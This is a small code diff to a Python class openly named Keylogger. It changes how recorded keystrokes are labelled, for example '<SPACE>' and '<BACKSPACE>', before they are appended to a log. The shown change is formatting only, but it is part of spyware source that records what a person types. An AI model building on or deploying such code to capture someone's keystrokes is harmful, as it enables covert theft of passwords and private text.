@@ -20,14 +20,16 @@ class Keylogger:
         name = event.name
         if len(name)>1:
             if name== "space":
-                name = "[SPACE]"
+                name = "<SPACE>"
             elif name == "enter":
-                name ="[Enter]\n"
+                name ="<Enter>"
+            elif name == "backspace":
+                name ="<BACKSPACE>"
             elif name == "tab":
-                name = "[TAB]"
+                name = "<TAB>"
             else:
                 name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
+                name = f"<{name.upper()}>"
         self.log += name
 
     # File Updates
